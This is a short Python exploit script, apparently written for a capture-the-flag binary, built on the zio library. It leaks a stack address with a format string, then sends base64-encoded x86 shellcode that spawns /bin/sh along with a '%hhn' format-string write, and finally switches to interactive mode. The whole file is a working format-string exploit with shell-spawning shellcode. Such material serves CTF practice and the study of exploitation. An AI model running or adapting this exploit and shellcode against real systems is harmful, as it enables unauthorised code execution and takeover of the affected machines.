from zio import *
from base64 import *

io  = zio(target = './nobug_acc0c1b37bec49e0575c94a3916cc771', timeout = 100000)
io.hint([0x08048b6f])
fs1 = '%4$08x'
io.wl(b64encode(fs1))
esp = int(io.r(8)[5:], 16) + 0x4
print hex(esp)
print fs1
# fs2 = '%0{}x%4$hhn%0{}x%12$08x'.format(esp, 0xa8a0 - esp)
shellcode = (
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
            "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
            )
fs2 = shellcode + '%0{}x%4$hhn'.format(esp - len(shellcode))
print fs2
io.wl(b64encode(fs2))
io.itr()
